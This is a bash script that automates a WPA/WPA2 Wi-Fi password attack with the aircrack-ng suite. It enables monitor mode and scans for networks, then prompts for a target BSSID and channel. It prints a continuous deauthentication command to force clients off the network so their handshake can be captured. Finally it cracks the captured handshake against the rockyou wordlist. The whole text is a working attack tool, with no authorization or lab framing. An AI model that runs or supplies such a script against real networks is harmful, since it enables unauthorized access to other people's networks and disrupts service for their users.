#!/bin/bash
# Aircrack-ng Automation Script (WPA/WPA2)
# Run as root: sudo ./aircrack_auto.sh

# --- Configuration ---
INTERFACE="wlan0" # Change to your wireless interface (e.g., wlan0, wlan1)
WORDLIST="/usr/share/wordlists/rockyou.txt" # Path to your password wordlist
OUTPUT_PREFIX="capture"

# --- Colors ---
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

cleanup() {
    echo -e "${GREEN}[+] Cleaning up... Stopping monitor mode.${NC}"
    airmon-ng stop $MON_INTERFACE 2>/dev/null
    systemctl start NetworkManager 2>/dev/null
    exit 0
}

# Set trap for cleanup on script exit
trap cleanup EXIT

echo -e "${GREEN}[+] Starting Aircrack-ng Automation...${NC}"

# 1. Kill conflicting processes
echo -e "${GREEN}[+] Killing conflicting processes...${NC}"
airmon-ng check kill
sleep 2

# 2. Start monitor mode
echo -e "${GREEN}[+] Starting monitor mode on $INTERFACE...${NC}"
airmon-ng start $INTERFACE
sleep 2
MON_INTERFACE=$(iwconfig 2>&1 | grep "Mode:Monitor" | awk '{print $1}')

# 3. Capture handshake
echo -e "${GREEN}[+] Starting airodump-ng... Press Ctrl+C when you see your target network.${NC}"
# Temporarily ignore SIGINT (Ctrl+C) for this command
trap '' SIGINT
airodump-ng $MON_INTERFACE
trap - SIGINT # Restore default SIGINT behavior

# After Ctrl+C, prompt for target details
read -p "Enter Target BSSID: " BSSID
read -p "Enter Target Channel: " CHANNEL
read -p "Enter Filename for Handshake (e.g., gal.cap): " FILENAME

# Print the aireplay-ng command for the user to copy
echo -e "${YELLOW}[+] Open a NEW terminal tab and run the following command:${NC}"
echo -e "${GREEN}sudo aireplay-ng --deauth 0 -a $BSSID $MON_INTERFACE${NC}"
echo -e "${YELLOW}[+] Press Enter after running the command in the new tab.${NC}"
read -p "Press Enter to continue capturing the handshake..."

# Start capturing the handshake
echo -e "${GREEN}[+] Capturing handshake for $BSSID on Channel $CHANNEL...${NC}"
airodump-ng -c $CHANNEL --bssid $BSSID -w $FILENAME $MON_INTERFACE

# 4. Crack the password
echo -e "${GREEN}[+] Attempting to crack with aircrack-ng...${NC}"
aircrack-ng -w $WORDLIST ${FILENAME}-01.cap

cleanup
